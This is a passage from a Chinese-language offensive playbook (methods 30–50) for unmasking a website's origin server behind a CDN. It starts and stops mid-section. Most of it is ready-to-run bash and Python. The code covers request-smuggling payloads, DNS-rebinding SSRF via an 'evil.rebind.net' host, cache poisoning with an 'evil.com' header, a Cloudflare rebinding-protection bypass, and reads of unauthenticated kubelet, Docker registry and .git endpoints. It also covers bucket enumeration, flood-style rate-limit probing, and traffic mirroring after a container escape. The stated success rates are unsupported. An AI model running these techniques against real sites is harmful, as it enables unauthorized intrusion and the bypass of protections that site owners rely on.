# HTTP/3 通过 Alt-Svc 头通告
curl -sI https://target.com | grep -i "alt-svc"
# 示例: alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400

# === 2. QUIC 直连源站 ===
# 部分 CDN 仅代理 TCP/HTTP2，QUIC 流量可能直连源站
# curl 编译 --with-http3
curl --http3 -k -H "Host: target.com" "https://候选IP" -v 2>&1 | grep -iE "HTTP/3|server|alt-svc"

# === 3. nmap QUIC 探测 ===
# nmap 提供 quic-info 脚本
nmap -sU -p 443 --script quic-info target.com

# === 4. qlog 与连接 ID 分析 ===
# QUIC 连接 ID (CID) 在不同节点可能不同
# 源站直连时 CID 模式与 CDN 边缘不同
# 工具: quiche-client, ngtcp2

# === 5. HTTP/3 0-RTT 回源 ===
# 0-RTT 数据可能绕过 CDN 缓存逻辑直接回源
# 触发 0-RTT 重放可能命中源站
```

### 方法 31：TLS 1.3 ECH / SNI 操纵（成功率 25%）

```bash
# === 1. ECH (Encrypted Client Hello) 检测 ===
# ECH 隐藏真实 SNI，但 ECH 配置 (HTTPS RR) 公开
dig HTTPS target.com +short
# 示例: 1 . ipv4hint=1.2.3.4 alpn=h3,h2 ech=...base64...
# ipv4hint 字段可能直接包含源站 IP！

# === 2. SNI 缺省/伪造触发源站响应 ===
# 部分源站按 SNI 路由，缺省 SNI 返回默认页（含源站信息）
openssl s_client -connect 候选IP:443 -noservername </dev/null 2>&1 | grep -iE "subject|issuer|CN"
curl -k --resolve target.com:443:候选IP https://target.com --connect-to ::候选IP: -v 2>&1 | grep -i "server:"

# === 3. 多 SNI 轮试 ===
# 用不同 SNI 访问候选 IP，对比响应差异
for sni in target.com www.target.com "" cdn.target.com; do
  echo "=== SNI: $sni ==="
  openssl s_client -connect 候选IP:443 -servername "$sni" </dev/null 2>/dev/null | \
    openssl x509 -text -noout 2>/dev/null | grep -E "Subject:|Issuer:"
done

# === 4. DoH 端点侧信道 ===
# Cloudflare DoH (1.1.1.1) 与源站 DoH 可能配置不同
curl -sH "accept: application/dns-json" "https://1.1.1.1/dns-query?name=target.com&type=A"

# === 5. ECH 重试攻击 ===
# ECH 拒绝时返回 retry_configs，对比 retry_configs 的公网解析
# 可推断源站与 CDN 边缘的 ECH 部署差异
```

### 方法 32：容器 / K8s Ingress 暴露（成功率 40%）

```bash
# === 1. Ingress Controller 指纹 ===
# Nginx Ingress: Server: nginx, 含 nginx-ingress 版本特征
# Traefik: Server: Traefik
# Istio: Server: istio-envoy
# HAProxy: via: haproxy
curl -sI https://target.com | grep -iE "^server:|via:" 
# Traefik 默认暴露 /dashboard 和 /api/rawdata（若未鉴权）
curl -s https://target.com/dashboard/ | head
curl -s https://target.com/api/rawdata | jq '.services[]?.servers[]?.url' 2>/dev/null  # ← 直接泄露后端 Pod IP

# === 2. K8s API Server / Metrics 端点 ===
# 若 K8s API (6443/8443) 误暴露公网
nmap -p 6443,8443,10250,10255,2379 候选IP
# 10250 (kubelet) 未鉴权可读 Pod 列表 → 直接拿到源站 Pod IP
curl -k https://候选IP:10250/pods

# === 3. Service NodePort / LoadBalancer 暴露 ===
# NodePort 范围 30000-32767，源站服务可能直接暴露
nmap -p 30000-32767 候选IP --open

# === 4. 容器仓库泄露 ===
# Docker Registry 5000 端口未鉴权 → 读取镜像分层中的源站配置
curl -s http://候选IP:5000/v2/_catalog
curl -s http://候选IP:5000/v2/target/manifests/latest | jq '.history[].v1Compatibility' | grep -oP 'https?://[0-9.]+'

# === 5. Shodan/FOFA 搜索 Ingress 指纹 ===
# Shodan: http.component:"nginx-ingress" http.title:"404 Not Found"
# FOFA: header="Traefik" && body="dashboard"
```

### 方法 33：CI/CD 管道泄露（成功率 35%）

```bash
# === 1. .git 目录泄露 ===
# 源站若忘记禁止 .git 访问，可还原仓库 → 配置含源站 IP
curl -s https://target.com/.git/config
curl -s https://target.com/.git/HEAD
# 工具还原: git-dumper, GitHack
# python3 -m pip install git-dumper
# git-dumper https://target.com/.git ./dump
grep -rE 'https?://[0-9]{1,3}(\.[0-9]{1,3}){3}' dump/  # ← 从配置文件提取源站 IP

# === 2. GitHub Actions / GitLab CI 泄露 ===
# .github/workflows/*.yml 中的 secrets、self-hosted runner IP
# GitHub dork (需授权搜索): "target.com" filename:deploy.yml
# 关注 deploy 步骤: ssh root@1.2.3.4 / scp ... user@1.2.3.4
# self-hosted runner 的公网 IP = 源站或跳板机

# === 3. 构建产物调试信息 ===
# sourcemap / webpack jsonp 含原始路径
curl -s https://target.com/static/js/app.js.map | jq -r '.sources[]' | grep -v node_modules
# .env.example / docker-compose.yml 提交到仓库 → 含源站配置
# GitHub dork: "target.com" filename:docker-compose.yml

# === 4. CI/CD 日志泄露 ===
# 公开仓库的 Actions 日志可能打印源站 IP
# 工具: github-subdomains, gitleaks, trufflehog
# 搜索: "Deploying to" "1.2.3.4" repo:target/*

# === 5. 包管理器 registry 关联 ===
# 私有 npm/PyPI 包中的 README/配置可能含源站
# npm view target-package
```

### 方法 34：云存储桶枚举（成功率 50%）

```bash
# === 1. AWS S3 桶枚举 ===
# 桶名通常 = 域名主体
for name in target target-com target-com-prod target-backup target-assets; do
  for region in s3 s3-us-west-2 s3-ap-southeast-1 s3-eu-west-1; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://${name}.${region}.amazonaws.com/")
    [ "$code" != "404" ] && echo "命中: ${name}.${region} ($code)"
  done
done
# 静态网站端点 (可能直连源站): https://${name}.s3-website-${region}.amazonaws.com

# === 2. 阿里云 OSS / 腾讯云 COS / 华为 OBS ===
# OSS: target.oss-${region}.aliyuncs.com
# COS: target.cos.${region}.myqcloud.com
# OBS: target.obs.${region}.myhuaweicloud.com
for region in cn-hangzhou cn-beijing cn-shanghai cn-shenzhen cn-hongkong; do
  curl -s -o /dev/null -w "OSS ${region}: %{http_code}\n" "https://target.oss-${region}.aliyuncs.com/"
done

# === 3. 桶策略配置泄露源站 ===
# 桶的 policy/logging 配置可能包含源站信息
curl -s https://target.s3.amazonaws.com/?policy
curl -s https://target.s3.amazonaws.com/?logging
# 桶的 CORS 配置常含源站 Origin
curl -s https://target.s3.amazonaws.com/?cors | grep -iE "AllowedOrigin"

# === 4. 工具自动化枚举 ===
# lazarus (Python): pip install lazarus
# bucket_finder, aws_s3_cred, cloud_enum
# python3 cloud_enum.py -k target
```

### 方法 35：WebSocket 长连接源站（成功率 30%）

```bash
# === 1. 发现 WebSocket 端点 ===
curl -s https://target.com | grep -oP 'wss?://[^"'\''<\s]+' | sort -u
# 常见路径: /ws, /socket.io/, /live, /realtime, /chat, /events

# === 2. WebSocket 直连候选 IP ===
# WebSocket 升级请求可能绕过 HTTP 缓存层直连源站
echo -e "GET /ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n" | \
  nc -w 3 候选IP 443 | head -1  # 用 openssl s_client 替代 nc 走 TLS
# 工具: websocat, wscat
# websocat -H "Host: target.com" wss://候选IP/ws --tls
wscat -c "wss://候选IP/ws" -H "Host: target.com" --no-check

# === 3. Socket.io Engine.io 协议泄露 ===
# /socket.io/?EIO=4&transport=polling 响应含 sid 与节点信息
curl -s "https://target.com/socket.io/?EIO=4&transport=polling"
# 直连候选 IP 对比 sid 前缀，相同 → 同一源站进程

# === 4. WebSocket 帧中的源站 IP ===
# 部分应用通过 WS 推送调试信息/日志，含源站内网 IP
# 长连接监听并 grep IP 模式
```

### 方法 36：缓存投毒 / 欺骗取源站（成功率 25%，进阶）

```bash
# === 1. 缓存键不一致回源 ===
# CDN 按 URL 缓存，源站按不同规则路由
# 路径混淆: /admin.php;.js → CDN 当静态缓存，源站当 PHP 执行回源
curl -sk -H "Host: target.com" "https://target.com/admin.php;.css"
curl -sk -H "Host: target.com" "https://target.com/admin.php?x=$(date +%s)"  # 时间戳破缓存

# === 2. Web Cache Deception 取源站内容 ===
# 强制源站返回敏感页面的"缓存版本"
# 路径: /account/settings/style.css → 源站按路径前缀返回账户页（含源站特征）
curl -sk "https://target.com/account/settings/style.css" | grep -iE "server|x-powered|set-cookie"
# 对比: 该响应来自源站而非 CDN 缓存模板

# === 3. 参数污染迫使回源 ===
# 添加 CDN 不识别的参数 / 编码差异 → 缓存未命中 → 回源
curl -sk "https://target.com/?utm_source=$(uuidgen)"
curl -sk "https://target.com/%2f"  # 编码斜杠差异

# === 4. 利用 X-Forwarded-Host 投毒 ===
# 部分源站按 X-Forwarded-Host 生成绝对 URL（含源站主机名）
curl -sk -H "X-Forwarded-Host: evil.com" https://target.com/ | grep -oP 'https?://[^/"]+target[^/"]*'

# === 5. Vary 头差异回源 ===
# 不同 Accept-Encoding 触发不同缓存键 → 回源
for enc in gzip br deflate identity; do
  curl -sI -H "Accept-Encoding: $enc" https://target.com/ | grep -iE "x-cache|via|server"
done
```

### 方法 37：HTTP 请求走私（CDN ↔ 源站，成功率 20%，高阶）

```bash
# === 1. CL.TE 检测（前端 CDN 用 Content-Length，源站用 Transfer-Encoding）===
# smuggler 工具自动检测
# git clone https://github.com/defparam/smuggler
# python3 smuggler.py -u https://target.com
# 手动构造:
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' | \
  openssl s_client -quiet -connect 候选IP:443 -servername target.com 2>/dev/null

# === 2. TE.CL 检测 ===
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | \
  openssl s_client -quiet -connect 候选IP:443 -servername target.com 2>/dev/null

# === 3. 走私后读取源站内部响应 ===
# 走私的"下一次"请求会命中源站内部路由
# 源站 /admin、/internal-health、/actuator 返回的信息含源站特征
# 关注响应头: Server、X-Powered-By、源站独有的 Set-Cookie 域

# === 4. HTTP/2 降级走私 ===
# CDN↔源站走 HTTP/2，源站后端 HTTP/1.1 → cleartext smuggling
# h2c smuggling: 升级连接到 HTTP/2 直达源站
# 工具: h2csmuggler
# python3 h2csmuggler.py --no-upgrade https://target.com http://源站内网/
```

### 方法 38：GraphQL Introspection 泄露（成功率 35%）

```bash
# === 1. 发现 GraphQL 端点 ===
for path in /graphql /graphql/console /api/graphql /v1/graphql /query /gql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
  [ "$code" = "200" ] && echo "命中: ${path}"
done

# === 2. Introspection 取 Schema ===
# Schema 中可能含源站相关字段: originUrl, backendHost, debugInfo
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}' | jq

# === 3. 调试字段触发源站信息 ===
# 开发环境常留 _debug, _meta, _system 字段
for q in '{_meta{origin}}' '{_debug{requestIp backendHost}}' '{__typename}' \
         '{serverInfo{hostname ip}}'; do
  echo "=== $q ==="
  curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d "{\"query\":\"$q\"}"
done

# === 4. 错误堆栈泄露 ===
# 构造畸形查询触发后端错误，堆栈中含源站路径/IP
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ nonExistentField }"}' | jq -r '.errors[].message,.errors[].extensions'
```

### 方法 39：SSE / Server-Sent Events 源站（成功率 25%）

```bash
# === 1. 发现 SSE 端点 ===
curl -s https://target.com | grep -oP '(EventSource\(|src=")[^"]*' | grep -v '\.js'
# 常见路径: /events, /stream, /sse, /live, /subscribe

# === 2. 直连候选 IP 拉取 SSE 流 ===
# SSE 长连接不走 CDN 缓存，直连源站
curl -sk -N -H "Host: target.com" -H "Accept: text/event-stream" "https://候选IP/events" --max-time 10 | head -50
# 流中常含服务端推送的内部状态: {"node":"origin-1","ip":"10.0.0.5"}

# === 3. Last-Event-ID 重放 ===
# SSE 断线重连用 Last-Event-ID，可重放历史事件（含源站信息）
curl -sk -N -H "Host: target.com" -H "Last-Event-ID: 0" "https://target.com/events" --max-time 10

# === 4. SSE 与 CDN 超时差异 ===
# CDN 对长连接有超时（通常 100s），源站超时更长
# 观察连接被谁切断，可判断是否到达源站
timeout 120 curl -sk -N -H "Host: target.com" "https://候选IP/events" -v 2>&1 | grep -iE "disconnect|timeout|server"
```

### 方法 40：移动 App / 小程序硬编码 IP（成功率 45%）

```bash
# === 1. APK 反编译提取硬编码 IP ===
# 工具: jadx, apktool, MobSF
# jadx -d target_apk target.apk
grep -rEo '([0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]+)?' target_apk/ | sort -u
# 关注: API 域名、灰度环境、debug 开关
# 字符串常含: http://1.2.3.4:8080/api, https://test.target.com

# === 2. 小程序反编译 ===
# 微信小程序包: wxapkg 解包
# 工具: unveilr, wxappUnpacker
# 解包后 grep: app.json, config.js 中的 baseURL
grep -rEo 'https?://[^"'\'' ]+' unpacked/ | grep -vE 'weixin|qq\.com' | sort -u

# === 3. 抓包对比 ===
# App 的网络配置可能含 IP 直连（绕过 CDN 用于灰度）
# Charles/mitmproxy 抓包 → 找到非 CDN IP 的请求

# === 4. Frida 动态 hook ===
# hook 网络库获取运行时真实请求 IP
# frida -U -l hook.js -f com.target.app
# hook OkHttp 的 Dns 接口打印真实解析结果

# === 5. iOS IPA 字符串提取 ===
# class-dump + strings
# strings Target.app/Target | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u
```

### 方法 41：DNS Rebinding → SSRF 源站发现（成功率 40%，v5.0 新增）

> DNS Rebinding 攻击让浏览器/WAF 绕过同源策略，从内网侧发起对源站的请求。利用 CDN 回源时 DNS 解析到内网地址，触发 SSRF 访问源站。

```bash
# === 1. 原理：低 TTL DNS 记录切换 ===
# 利用低 TTL 的 DNS 记录，第一次解析返回公网 IP（绕过 CDN WAF），
# 第二次解析返回内网 IP（源站），触发 SSRF
# 工具: singularity (https://github.com/nccgroup/singularity)
# singularity --port 8080 --response-ip 1.2.3.4 --rebind-ip 10.0.0.5

# === 2. 利用 CDN 回源 DNS 解析 ===
# CDN 回源时 DNS 解析源站 IP，若源站域名可控（如 origin.target.com）
# 修改 DNS 为低 TTL 记录，先返回 CDN 信任的 IP，再切换为内网 IP
# 触发 CDN 向内网发起请求 → 泄露内网源站

# === 3. SSRF 负载注入 ===
# 构造链接指向可控域名的 rebinding 服务
# 注入到 CDN 回源请求中:
# Host: target.com
# X-Forwarded-Host: evil.rebind.net
# Origin: https://evil.rebind.net
# → CDN 回源时解析 evil.rebind.net → 切换为内网 IP → SSRF

# === 4. 验证 rebinding 是否生效 ===
# 在 VPS 运行 singularity，观察 CDN 是否发起内网请求
python3 -c "
import time, socket
# 模拟 rebinding: 第一次返回 VPS IP, 第二次返回内网 IP
host = 'origin.target.com'
first = socket.gethostbyname(host)
time.sleep(1)
second = socket.gethostbyname(host)
if first != second:
    print(f'Rebinding 生效: {first} → {second}')
"

# === 5. Cloudflare DNS rebinding 防护绕过 ===
# Cloudflare 默认拦截 DNS rebinding (返回 1.0.0.1 或 127.0.0.1)
# 绕过: 使用 IPv6 地址 rebinding 或 0.0.0.0
# 或利用 Cloudflare 的 DNS 缓存时间窗口 (TTL > 0 时使用缓存)
```

### 方法 42：CDN 缓存清除/预热回源泄露（成功率 35%，v5.0 新增）

> CDN 管理面板的缓存清除（Purge）和预热（Prefetch）功能会触发回源请求。回源请求的响应头/错误信息可能泄露源站 IP。

```bash
# === 1. 缓存清除触发的回源响应 ===
# 大多数 CDN 的 Purge 操作会触发回源重新获取内容
# 观察清除后的首次请求响应头变化
curl -sI https://target.com/resource | grep -iE "server:|x-cache:|via:"
# 在 CDN 面板执行 Purge 后立即再次请求
curl -sI https://target.com/resource | grep -iE "server:|x-cache:|via:"
# 对比两次 Server 头变化 → 区分 CDN 边缘 vs 源站

# === 2. 预热 (Prefetch) 路径泄露 ===
# 部分 CDN 的预热功能接受 URL 参数
# 提交预热 URL 时，CDN 回源抓取 → 源站收到请求
# 在源站日志中观测 CDN 回源 IP 段
# Cloudflare: 手动 Purge → 观察 x-cache: MISS 时的响应

# === 3. CDN API 回源测试 ===
# 阿里云 CDN: RefreshObjectCaches API
# 腾讯云 CDN: PurgeUrlsCache API
# AWS CloudFront: CreateInvalidation API
# 清除后首次请求 200 但 Server 头不同 → 源站直连

# === 4. 缓存键 (Cache Key) 操纵 ===
# 修改请求参数使缓存键变化，强制回源
# 原始: GET /api/data?t=123 → CDN HIT
# 操纵: GET /api/data?t=124&_nocache=1 → CDN MISS → 回源
# 回源时观察响应头变化
for i in $(seq 1 10); do
  curl -sI "https://target.com/?_cache=$RANDOM" | grep -iE "server:|x-cache:"
done

# === 5. Origin 响应头泄露 ===
# 回源响应中可能包含 CDN 边缘不会添加的头
# 对比 CDN HIT vs MISS 的响应头差异
curl -sI "https://target.com/" | tee hit.txt
curl -sI "https://target.com/?$(date +%s)" | tee miss.txt
diff <(sort hit.txt) <(sort miss.txt)
# 差异项中可能是源站专属响应头
```

### 方法 43：HTTP/2 HPACK 压缩侧信道（成功率 25%，v5.0 新增）

> HTTP/2 的 HPACK 压缩表在 CDN 边缘和源站各自维护。通过分析压缩前后响应大小差异，推断源站是否与 CDN 边缘共享 HPACK 表，从而区分 CDN 节点与源站。

```bash
# === 1. 原理 ===
# HPACK 使用动态表压缩重复的头字段
# CDN 边缘 → 源站的 HPACK 压缩表不同
# 响应大小差异可推断源站信息

# === 2. 测量 HTTP/2 响应大小差异 ===
# 使用 h2load 或 curl --http2 比较
# 第一个请求(冷启动) vs 后续请求(热连接)
curl -s --http2 -o /dev/null -w "%{size_download}\n" https://target.com/
curl -s --http2 -o /dev/null -w "%{size_download}\n" https://target.com/
# 若两次大小相同 → CDN 统一压缩, 若不同 → 可能直达源站

# === 3. HPACK 炸弹探测 ===
# 发送大量不同头字段，观察响应大小变化
# 若 CDN 边缘有独立 HPACK 表，大小趋于稳定
# 若直连源站，大小随 HPACK 表膨胀增加
python3 << 'PYEOF'
import requests, http.client
# 使用 h2 库发送 HTTP/2 请求
# pip install h2
import h2.connection, socket, ssl
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(socket.create_connection(('target.com', 443)), server_hostname='target.com')
conn = h2.connection.H2Connection()
conn.initiate_connection()
sock.sendall(conn.data_to_send())
# 发送多个不同 header 观察响应
for i in range(20):
    headers = [(':method', 'GET'), (':path', '/'), (':authority', 'target.com'),
               (f'x-custom-{i}', f'value-{i}')]
    conn.send_headers(1, headers, end_stream=True)
    sock.sendall(conn.data_to_send())
    data = sock.recv(65535)
    print(f"请求 {i}: 响应大小 {len(data)} bytes")
sock.close()
PYEOF

# === 4. 对比 CDN 节点 vs 候选 IP 的 HPACK 行为 ===
# 对候选 IP 发送相同请求，对比压缩行为差异
# 若压缩模式不同 → 候选 IP 可能是源站（非 CDN 节点）
```

### 方法 44：Anycast IP 去匿名化（成功率 30%，v5.0 新增）

> Anycast IP 同一 IP 在不同地理位置对应不同物理服务器。通过全球多地 ping/traceroute，推断 CDN 边缘节点的实际物理位置，进而发现源站所在区域。

```bash
# === 1. 全球多地 ping 获取延迟差异 ===
# 使用 check-host.net 或 ping.pe 的 API
# https://check-host.net/check-ping?host=target.com
# 分析延迟最小的节点 → 源站可能位于该区域

# === 2. 全球 traceroute 路径分析 ===
# 使用全球 VPS 网络做 traceroute
# 跳数最少的节点 → 离源站最近
# 工具: https://atlas.ripe.net/ (RIPE Atlas 探针网络)
for vps in us-east eu-west asia-east; do
  echo "=== $vps ==="
  ssh $vps "traceroute -n target.com"
done

# === 3. BGP 路由分析 ===
# 查看 target.com 的 BGP 路由路径
# curl -s "https://api.bgpview.io/ip/$(dig +short target.com)" | jq '.data.prefixes[].asn'
# 路由路径中最后一跳 ASN → 可能是源站 IDC 的 ASN

# === 4. 延迟三角定位 ===
# 三地 VPS 同时 ping，延迟差推断源站地理位置
# 工具: https://github.com/adulau/mmdbmeld
python3 << 'PYEOF'
# 简化三角定位: 收集多地延迟
import subprocess, re
target = "1.2.3.4"  # 候选 IP
locations = {
    "US-EAST": "us-east-vps",
    "EU-WEST": "eu-west-vps", 
    "ASIA-SE": "asia-se-vps"
}
for loc, vps in locations.items():
    result = subprocess.run(["ssh", vps, f"ping -c 1 {target} | grep avg"], 
                          capture_output=True, text=True)
    print(f"{loc}: {result.stdout.strip()}")
PYEOF
```

### 方法 45：CDN Origin Shield / 中间源绕过（成功率 35%，v5.0 新增）

> Cloudflare Origin Shield、Akamai SureRoute 等中间源功能在 CDN 边缘和源站之间增加额外的缓存层。利用 Origin Shield 的请求路由，可能发现源站或中间源 IP。

```bash
# === 1. Cloudflare Origin Shield 识别 ===
# Origin Shield 在特定区域（如 US-East）缓存回源请求
# 观察 x-cache: HIT 但 Server 头非 Cloudflare → 可能是 Origin Shield 节点
curl -sI https://target.com | grep -iE "x-cache|cf-cache-status|server"
# cf-cache-status: HIT + Server: nginx → Origin Shield 命中

# === 2. Origin Shield 区域绕过 ===
# 向不同区域边缘节点发送请求，绕过 Origin Shield
# 使用不同区域的 Cloudflare IP 作为目标
# cf_ips = curl -s https://www.cloudflare.com/ips-v4
for cf_ip in $(shuf -n 5 cf_ips.txt); do
  echo "=== 边缘: $cf_ip ==="
  curl -sI --resolve target.com:443:$cf_ip https://target.com | grep -iE "^HTTP|x-cache|server"
done

# === 3. Akamai SureRoute 绕过 ===
# SureRoute 走 Akamai 内部最优路径回源
# 通过请求不同区域的边缘节点找回源差异
# Akamai 边缘 IP 段: 23.0.0.0/12, 104.64.0.0/10
for ak_ip in 23.1.1.1 23.32.1.1 104.64.1.1; do
  curl -sI --resolve target.com:443:$ak_ip https://target.com | grep -iE "^HTTP|x-akamai|server"
done

# === 4. 中间源缓存 bypass ===
# 中间源也缓存内容，绕过需要特定条件
# 1) 请求中间源未缓存的新路径
# 2) 使用 Cache-Control: no-cache 头
# 3) 修改请求方法 (POST/PUT 可能不缓存)
curl -sI -X POST https://target.com/ | grep -iE "^HTTP|x-cache|server"
curl -sI -H "Cache-Control: no-cache" https://target.com/ | grep -iE "^HTTP|x-cache|server"
```

### 方法 46：速率限制差分分析（成功率 30%，v5.0 新增）

> CDN 和源站有不同的速率限制策略。通过对比 CDN 边缘和候选 IP 的限速行为，区分 CDN 节点与源站。

```bash
# === 1. CDN 边缘限速特征 ===
# Cloudflare: 429 带有 cf-ray 头
# AWS CloudFront: 429 带有 x-amz-cf-id
# 直连源站: 429/503 无 CDN 标识头

# === 2. 并发请求触发限速 ===
# 对候选 IP 发送大量并发请求，观察限速行为
python3 << 'PYEOF'
import requests, concurrent.futures, time
target = "https://候选IP"
results = []
def req(i):
    try:
        r = requests.get(target, headers={"Host": "target.com"}, verify=False, timeout=5)
        return r.status_code, dict(r.headers)
    except: return 0, {}
with concurrent.futures.ThreadPoolExecutor(50) as ex:
    futures = [ex.submit(req, i) for i in range(100)]
    for f in concurrent.futures.as_completed(futures):
        results.append(f.result())
# 分析限速模式
codes = [r[0] for r in results]
print(f"200: {codes.count(200)}, 429: {codes.count(429)}, 503: {codes.count(503)}")
PYEOF

# === 3. 对比 CDN 边缘 vs 候选 IP 的限速阈值 ===
# CDN 通常有更高的限速阈值（秒级数万 RPS）
# 源站可能较低（秒级数百 RPS）
# 若候选 IP 低阈值限速 → 更像源站

# === 4. 渐进式限速探测 ===
# 逐步增加并发，找出限速触发点
# 工具: ffuf -u https://候选IP/ -H "Host: target.com" -t 1 -c
# 然后 -t 10, -t 50, -t 100 逐步增加
for t in 1 10 50 100 200; do
  echo "并发: $t"
  ffuf -u "https://候选IP/FUZZ" -H "Host: target.com" -w /dev/null -t $t -c -s 2>&1
done
```

### 方法 47：eBPF/XDP 源站旁路检测（成功率 20%，v5.0 新增）

> 在已获得目标内网访问权限时，eBPF 程序可旁路监听内核网络事件，捕获 CDN 回源请求的真实目的 IP。

```bash
# === 1. bpftrace 监控 TCP 连接 ===
# 在源站服务器上运行（需 root）
# 监控所有 TCP 连接，过滤 CDN 回源 IP 段
bpftrace -e '
kprobe:tcp_connect {
  $sk = (struct sock *)arg0;
  $daddr = $sk->__sk_common.skc_daddr;
  $dport = $sk->__sk_common.skc_dport;
  printf("TCP connect: %s:%d\n", ntop($daddr), $dport);
}'

# === 2. XDP 包级别监控 ===
# 在源站入口网卡挂载 XDP 程序
# 记录所有入站连接，发现 CDN 回源 IP
# 需要编写 XDP 程序（C/BCC）

# === 3. tc (Traffic Control) 流量镜像 ===
# 将 CDN 回源流量镜像到分析端口
tc qdisc add dev eth0 ingress
tc filter add dev eth0 parent ffff: \
  protocol ip u32 match ip src 104.16.0.0/12 \
  action mirred egress mirror dev eth1

# === 4. Cilium 网络观测 ===
# 若集群使用 Cilium CNI，Hubble 可观测所有网络流
# hubble observe --from-pod namespace/源站namespace --to-world
# 观测 CDN 回源连接的源 IP（CDN 回源 IP 段）

# === 5. 实战场景 ===
# 场景: 获得目标 Docker 容器逃逸权限
# 在宿主机运行 bpftrace → 发现源站对外连接的 IP 中
# 有一个是 CDN 回源 IP → 记录该 IP → 即源站公网 IP
```

### 方法 48：跨域资源计时侧信道（成功率 25%，v5.0 新增）

> 浏览器 Performance API 可测量跨域资源加载时间。利用计时差异推断候选 IP 是否承载目标网站。

```bash
# === 1. Timing-Allow-Origin 头利用 ===
# 若源站设置 Timing-Allow-Origin: *，可精确测量资源加载时间
curl -sI https://候选IP | grep -i "timing-allow-origin"
# 若存在 → 可精确测量 → 用于计时侧信道

# === 2. 浏览器计时侧信道脚本 ===
# 部署到页面，测量候选 IP 的资源加载时间
python3 << 'PYEOF'
# 生成计时探测 HTML
html = '''
<html>
<script>
const targets = ["1.2.3.4", "5.6.7.8"];  // 候选 IP
const results = {};
targets.forEach(ip => {
  const img = new Image();
  const start = performance.now();
  img.onload = img.onerror = () => {
    results[ip] = performance.now() - start;
    console.log(ip, results[ip]);
  };
  img.src = `https://${ip}/favicon.ico`;
});
</script>
</html>
'''
with open('timing.html', 'w') as f: f.write(html)
print("打开 timing.html 在浏览器控制台查看结果")
print("加载时间最短的 IP → 可能是源站（延迟低）")
PYEOF

# === 3. DNS 解析计时 ===
# 测量候选 IP 的 DNS 解析时间
# 源站 IP 通常解析更快（同一 DNS 服务器缓存）
for ip in 1.2.3.4 5.6.7.8; do
  start=$(date +%s%N)
  dig +short -x $ip > /dev/null
  end=$(date +%s%N)
  echo "$ip → $(( (end-start)/1000000 ))ms"
done

# === 4. TLS 握手计时 ===
# 测量 TLS 握手时间，差异反映源站距离
for ip in 1.2.3.4 5.6.7.8; do
  time curl -sk -o /dev/null -w "TCP: %{time_connect}s TLS: %{time_appconnect}s\n" \
    -H "Host: target.com" "https://$ip"
done
```

### 方法 49：源站 IP 漂移实时追踪（成功率 50%，v5.0 新增）

> 源站 IP 并非一成不变：CDN 回源切换、服务器迁移、故障切换都会导致 IP 变化。建立持续监控，在漂移时捕获新源站 IP。

```bash
# === 1. 基于 DNS 变更的漂移检测 ===
# 监控目标域名 A 记录的变更
python3 << 'PYEOF'
import subprocess, time, json
known = {}
targets = ["target.com", "origin.target.com", "backend.target.com"]
while True:
    for t in targets:
        ips = subprocess.run(["dig", "+short", "A", t], capture_output=True, text=True).stdout.strip().split()
        if ips and t in known and ips != known[t]:
            new = set(ips) - set(known[t])
            old = set(known[t]) - set(ips)
            if new: print(f"[漂移] {t}: {old} → {new} (新增: {new})")
        known[t] = ips
    time.sleep(300)  # 每 5 分钟检查
PYEOF

# === 2. 响应头变化监控 ===
# 监控 Server/X-Cache 头变化
# 若 Server 头从 cloudflare 变为 nginx → 可能 CDN 被绕过
python3 -c "
import requests, time
prev = None
while True:
    r = requests.get('https://target.com', timeout=10)
    h = r.headers.get('Server', '') + '|' + r.headers.get('X-Cache', '')
    if prev and h != prev:
        print(f'[头变化] {prev} → {h}')
    prev = h
    time.sleep(60)
"

# === 3. 证书变更监控 ===
# 监控证书 SHA256 指纹变化
# 证书变更 → 可能切换了源站
python3 -c "
import ssl, socket, hashlib, time
def get_cert_hash(host):
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
        s.settimeout(5); s.connect((host, 443))
        cert = s.getpeercert(binary_form=True)
        return hashlib.sha256(cert).hexdigest()
prev = get_cert_hash('target.com')
print(f'初始证书: {prev[:16]}...')
while True:
    time.sleep(3600)
    h = get_cert_hash('target.com')
    if h != prev:
        print(f'[证书变更] {prev[:16]} → {h[:16]}')
        prev = h
"

# === 4. cron 定时任务 ===
# 每 30 分钟运行 cdn_tracer.py 并对比 JSON 报告
# */30 * * * * cd /path/to/skills && python3 cdn_tracer.py target.com --no-verify -o /tmp/report.json
# 对比新旧报告: 新增 IP → 可能是漂移后的源站

# === 5. 告警: 非 CDN 段新 IP 出现 ===
# 解析最新的被动 DNS 数据，出现新 IP 且不在 CDN 段 → 告警
python3 -c "
from cdn_ranges import is_cdn
new_ips = ['1.2.3.4', '5.6.7.8']  # 从被动 DNS 获取
for ip in new_ips:
    if not is_cdn(ip):
        print(f'[告警] 非 CDN 新 IP: {ip} → 可能是源站漂移')
"
```

### 方法 50：CDN 回源认证绕过（Signed URL / Token 验证）（成功率 30%，v5.0 新增）

> 部分 CDN 使用 Signed URL 或 Token 认证回源请求。绕过认证可直接访问源站，且源站因信任回源请求而暴露更多信息。

```bash
# === 1. Signed URL 算法识别 ===
# 常见格式:
# CloudFront: ?Expires=xxx&Signature=xxx&Key-Pair-Id=xxx
# 阿里云 CDN: ?auth_key=xxx-xxx-xxx-xxx
# 腾讯云 CDN: ?sign=xxx&t=xxx
# 识别签名算法: 观察 URL 参数模式
